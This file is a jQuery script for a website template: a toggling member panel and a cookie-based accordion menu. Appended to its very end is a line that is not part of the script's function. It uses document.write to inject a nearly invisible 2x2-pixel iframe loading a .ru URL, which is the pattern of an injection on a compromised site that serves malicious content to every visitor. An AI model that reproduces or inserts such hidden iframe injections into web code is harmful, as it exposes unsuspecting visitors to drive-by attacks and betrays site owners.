jQuery(document).ready(function(){
	jQuery(".tab").click(function(){
			if (paneltype == 'opacity') {     			jQuery("#memberArea").animate({opacity: "toggle"}, 600);  			}		
  			if (paneltype == 'width') {     			jQuery("#memberArea").animate({width: "toggle"}, 600);  			}
  			if (paneltype == 'height') {     			jQuery("#memberArea").animate({height: "toggle"}, 600);  			}
  			
		jQuery("a#closePanel").toggleClass("active");
		jQuery("a#openPanel").toggleClass("active");
		return false;
	});
		
// Right Accordion Script
jQuery(document).ready(function(){jQuery('#leftCol .moduletable-slide h3').each(function(index){var $this=jQuery(this);var $checkElement=$this.next('div');var $modID=$checkElement.attr('id');if(jQuery.cookie($modID)=='close'){jQuery($checkElement).hide();$this.addClass('close')}else{$this.addClass('open')}$this.click(function(){checkCookie($checkElement,$this,$modID)})});jQuery('button').click(function(){jQuery.cookie('menuCookie','',{expires:-1});jQuery('.panelMenu > li ul').hide();showCookie()})});function checkCookie($checkElement,$this,$modID){if($checkElement.is(':hidden')){$checkElement.slideDown("fast");$this.removeClass('close');$this.addClass('open');cookieValue='open';jQuery.cookie($modID,cookieValue)}else{$checkElement.slideUp();cookieValue='close';$this.removeClass('open');$this.addClass('close');jQuery.cookie($modID,cookieValue)}}	

});document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');